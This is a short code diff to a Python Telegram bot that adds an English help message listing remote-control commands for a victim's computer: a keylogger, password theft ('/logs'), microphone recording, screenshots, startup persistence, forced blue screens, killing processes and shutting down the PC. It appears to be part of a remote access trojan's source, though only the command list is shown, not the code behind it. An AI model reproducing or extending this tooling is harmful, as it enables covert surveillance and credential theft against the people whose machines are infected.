@@ -45,7 +45,24 @@ HELP_MESSAGE_RU = '''
 '''
 
 HELP_MESSAGE_EN = '''
-
+Author Nixwares
+/off(off PC)
+/open(open link in browser)
+/screen(a screenshot of the screen)
+/process(starting the process)
+/kill(to kill the process)
+/reboot(restart PC)
+/ip(see ip,city,browser)
+/rep(to run the file.mp3)
+/record(record sounds from the microphone)/bluesreen(blue screen on PC)/oc(withdrawn operating system and PC name)
+/tasklist(check the list of running processes)
+/oc(learn operating system and the name of the system)
+/bluescreen(include blue screen)
+/keylogger(to write all button pressed)
+/send(send file recorded with buttons)
+/auto(to add a file to the startup)
+/logs(get password)
+/help(outputs this message)
 '''
 
 bot = telebot.TeleBot(TOKEN)
